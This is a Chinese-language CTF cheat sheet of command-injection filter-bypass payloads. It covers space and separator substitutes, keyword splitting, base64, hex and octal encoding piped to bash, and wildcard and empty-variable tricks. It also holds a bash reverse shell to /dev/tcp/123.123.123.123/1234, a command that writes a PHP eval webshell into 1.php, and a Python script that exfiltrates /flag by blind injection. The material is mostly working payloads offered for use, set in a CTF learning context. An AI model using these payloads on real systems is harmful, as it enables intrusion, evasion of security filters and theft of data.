[TOC]

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/命令执行绕过.jpg)

#### 空格

```
#常见的绕过符号有：
$IFS$9 、${IFS} 、%09(php环境下)、 重定向符<>、<、
kg=$'\x20flag.txt'&&cat$kg
# $IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用
set |grep IFS
IFS=$' \t\n'

<：输入重定向，后面需要接目录或者文件名，例如ls<./，所以不是所有的命令都可以使用它作为空格替代符，例如ping
<>：打开一个文件作为输入与输出使用。所以它比<的限制更严格，后面必须是文件，连目录都不行
%09：url 编码的制表符的。
%0a：url 编码的换行符。
```

#### 命令分隔符

```
%0a  #换行符，需要php环境
%0d  #回车符，需要php环境
%09  #TAB
%00	 #url 编码的 NULL，高版本（>=5.4.38）PHP 的 exec、system、passthru 都会拦截
;    #在 shell 中，是”连续指令”，不论;前面的命令执行成功与否都会执行后面的命令
&    #& 放在启动参数后面表示设置此进程为后台进程，这里可以巧妙地作为命令分隔符：ls&whoami实际上相当于 ls &; whoami，即将ls放到后台运行，结束后再运行 whoami。不管第一条命令成功与否，都会执行第二条命令
&&   #第一条命令成功，第二条才会执行
|    #第一条命令的结果，作为第二条命令的输入
||   #第一条命令失败，第二条才会执行
```

利用`{}`

花括号扩展本来的作用是组合，看下面的例子，a、b 都是候选字符，输出的结果是候选的组合。我们可以看到，中间多了一个空格。所以就可以这样利用

```bash
soyamilk@DESKTOP-13QDS1A:~$ echo {a,b}
a b
soyamilk@DESKTOP-13QDS1A:~$ echo ab{a,b}ccc
abaccc abbccc
soyamilk@DESKTOP-13QDS1A:~$ {a,b}
a: command not found
soyamilk@DESKTOP-13QDS1A:~$ {ls,.}
a  b  flag
soyamilk@DESKTOP-13QDS1A:~$ {cat,./flag}
flag{abc}
```

需要多个参数也是可以的，加多个`,`就行：`{ls,-al,./}`，不过需要注意，使用花括号扩展的时候，`{}`中不能有空格。

```
soyamilk@DESKTOP-13QDS1A:~$ {ls,-al,./}
total 24
drwxr-xr-x 1 soyamilk soyamilk 4096 Oct 16 16:31 .
drwxr-xr-x 1 root     root     4096 Jul 12 11:20 ..
-rw------- 1 soyamilk soyamilk 1617 Oct 16 18:07 .bash_history
-rw-r--r-- 1 soyamilk soyamilk  220 Jul 12 11:20 .bash_logout
-rw-r--r-- 1 soyamilk soyamilk 3771 Jul 12 11:20 .bashrc
drwxr-xr-x 1 soyamilk soyamilk 4096 Jul 12 11:20 .landscape
-rw-r--r-- 1 soyamilk soyamilk    0 Nov 23 15:16 .motd_shown
-rw-r--r-- 1 soyamilk soyamilk  807 Jul 12 11:20 .profile
-rw-r--r-- 1 soyamilk soyamilk    0 Sep 19 21:29 .sudo_as_admin_successful
-rw------- 1 soyamilk soyamilk 8273 Oct 16 16:30 .viminfo
-rw-r--r-- 1 soyamilk soyamilk   15 Oct 16 16:31 a
-rw-r--r-- 1 soyamilk soyamilk    0 Oct 16 16:31 b
-rw-r--r-- 1 soyamilk soyamilk   10 Oct 16 16:32 flag
```



#### 关键字

**能够进行查看的命令**

```
过滤系统命令关键字——换用关键字平替：
Linux中与cat类似的读取打开文件命令
nl：读取显示文件内容的时候，顺便标上行号
tac：从最后一行开始读取显示文件内容，容易发现tac是cat的倒序，即它俩在读取文件内容时顺序相反
more：一页一页的显示档案内容
less：与more类似
head：查看前几行（头部）
tail：查看后几行（尾部）
od：以二进制的方式读取档案内容
vi：一种编辑器，这个也可以查看
vim：一种编辑器，这个也可以查看
sort：可以查看
uniq: 可以查看
base64
```

- 拼接绕过

  ```
  #执行ls命令：
  a=l;b=s;$a$b
  #cat flag文件内容：
  a=c;b=at;c=f;d=lag;$a$b ${c}${d}
  #cat test文件内容
  a="ccaatt";b=${a:0:1}${a:2:1}${a:4:1};$b test
  ```

- 编码绕过

  ```
  #base64
  echo "Y2F0IC9mbGFn"|base64 -d|bash  ==> cat /flag
  echo Y2F0IC9mbGFn|base64 -d|sh      ==> cat /flag
  #hex
  echo "0x636174202f666c6167" | xxd -r -p|bash   ==> cat /flag
  
  $(printf "\154\163") ==>ls
  $(printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67") ==>cat /flag
  {printf,"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"}|\$0 ==>cat /flag
  #i也可以通过这种方式写马
  #内容为<?php @eval($_POST['c']);?>
  ${printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"} >> 1.php
  ```

- 单引号和双引号绕过

  ```
  c'a't /flag
  c"a"t /flag
  ```

- 反斜杠绕过

  ```
  ca\t /flag
  ```

- 通过$PATH绕过

  ```
  #echo $PATH 显示当前PATH环境变量，该变量的值由一系列以冒号分隔的目录名组成
  #当执行程序时，shell自动跟据PATH变量的值去搜索该程序
  #shell在搜索时先搜索PATH环境变量中的第一个目录，没找到再接着搜索，如果找到则执行它，不会再继续搜索
  echo $PATH 
  /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
  `echo $PATH| cut -c 8,9`t test
  $(echo $PATH| cut -c 8,9)t flag
  
  反引号和$()都起命令替换作用
  ```

- 通配符绕过

  >1. […]表示匹配方括号之中的任意一个字符
  >
  >2. {…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。
  >
  >3. {…}与[…]有一个重要的区别，当匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开
  >
  > ```
  >soyamilk@DESKTOP-13QDS1A:~$ cat fl[a,b,c]a
  >cat: 'fl[a,b,c]a': No such file or directory
  >soyamilk@DESKTOP-13QDS1A:~$ cat fl[a,b,c]g
  >flag{abc}
  >soyamilk@DESKTOP-13QDS1A:~$ cat fl{a,b,c}g
  >flag{abc}
  >cat: flbg: No such file or directory
  >cat: flcg: No such file or directory
  > ```
  >
  >
  >
  >
  >
  >1. `*`（星号）：匹配任意长度的任意字符。
  >
  >- 例如：`*.txt` 匹配所有以 `.txt` 结尾的文件名。
  >
  >2. `?`（问号）：匹配任意单个字符。
  >
  >- 例如：`file?.txt` 匹配类似 `file1.txt`、`fileA.txt` 等文件名。
  >
  >3. `[characters]`：匹配字符集中的任意一个字符。
  >
  >- 例如：`file[0-9].txt` 匹配类似 `file1.txt`、`file5.txt` 等文件名。
  >
  >4. `[!characters]` 或 `[^characters]`：匹配不在字符集中的任意一个字符。
  >
  >- 例如：`file[!0-9].txt` 匹配不以数字结尾的文件名。
  >
  >5. `{pattern1,pattern2,...}`：匹配指定的模式。
  >
  >- 例如：`{file1,file2}.txt` 匹配 `file1.txt` 和 `file2.txt`。
  >
  >6. `()`：用于创建子模式，通常与其他通配符结合使用。
  >
  >- 例如：`file{1,2}.txt` 与 `{file1,file2}.txt` 等效。
  >
  >7. `\`：用于转义特殊字符，让其失去其特殊含义。
  >
  >- 例如：`file\?.txt` 匹配 `file?.txt` 文件。

  ```
  cat t?st
  cat te*
  cat t[a-z]st
  cat t{a,b,c,d,e,f}st
  ```

- 利用`空`绕过

  Bash 很多东西都是`空`，例如`''`、不存在的变量等等，就可以利用他们来隔开命令

  ```
  l''s：l''s == ls
  
  "l""s"或者'l''s'或者'l'"s"或者l"s"...
  
  l${anything}s：因为anything不存在，是空的，所以l${anything}s == ls，与l''s原理一样。
  
  l$1s、l$2s、...、l$9s：相比上面那个，这个方法不用{}也可以，因为这类数字名变量的名称界定比较特殊。至于它们是什么意思：
  $0: Shell 本身，所以这里有个技巧是 {printf,"\167\150\157\141\155\151"} | $0
  $1~$n: Shell 的各参数值。$1 是第 1 个参数、$2 是第 2 个参数，以此类推。
  
  l$*s、l$@s：它们都表示所有 Shell 参数的列表，不包括脚本本身（即 $1 - $n）。但是还是有区别的。举例：执行 test.sh 1 2 3时，"$*"表示"1 2 3"，而"$@"表示"1" "2" "3"。二者没有被引号引起来时是一样的都为"1 2 3"，只有当被引号引起来后才不一样。
  
  l$!s：$!代表 Shell 最后运行的后台 Process 的 PID。可以简单地理解为，例如一个命令放到后台运行：ping baidu.com & 后它的 PID，没有放到后台的命令那就是空。
  
  c$()at key：$()代表执行一个空的命令，返回值也为空。当然这样也是可以的：l$(echo s)。
  l``s：这样当然也可以了。
  ```

  >`$0$1$2$3...`举例
  >
  >```
  >soyamilk@DESKTOP-13QDS1A:~$ cat test01.sh
  >echo $0
  >echo $1
  >echo $2
  >soyamilk@DESKTOP-13QDS1A:~$ . test01.sh Hello World!
  >-bash
  >Hello
  >World!
  >soyamilk@DESKTOP-13QDS1A:~$
  >```
  >
  >

### 无回显RCE

1. 重定向写文件

   >`ls | xargs sed -i "s/die/echo/"`
   >把die 替换成 echo
   >`ls | xargs sed -i "s/exec/system/"`
   >把exec 替换成 system

   2023 hectf EZphp

2. 反弹shell

   ```
   bash -c 'bash -i >& /dev/tcp/123.123.123.123/1234 0>&1'
   ```

3. 盲注

   需要盲注的情况：

   ```php
   <?php
   highlight_file(__FILE__);
   
   exec($_GET['cmd'],$output,$return_val);
   if(!$return_val)echo "success";
   else echo "fail";
   ```

   可以依据判据通过：

   ```
   if [ $(cut -c 1 /flag) = U ];then ls;else abcd;fi
   ```

   来逐位爆破`/flag`文件的内容。

   盲注脚本：

   ```python
   import requests
   flag=''
   for i in range(1,100):
       for j in '}{-abcdefghijklmnopqrstuvwxyz0123456789`':
           url=f'http://localhost/?cmd=if [ $(cut -c {i} /f???) = {j} ]%0Athen ls%0Aelse abcd%0Afi'
           print(url)
           R=requests.get(url)
           R.encoding='utf-8'
           if 'success' in R.text:
               flag+=j
               break
           if j=='`':
               break
   print(flag)
   ```


![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/1999159-20201002223158950-1419102854.png)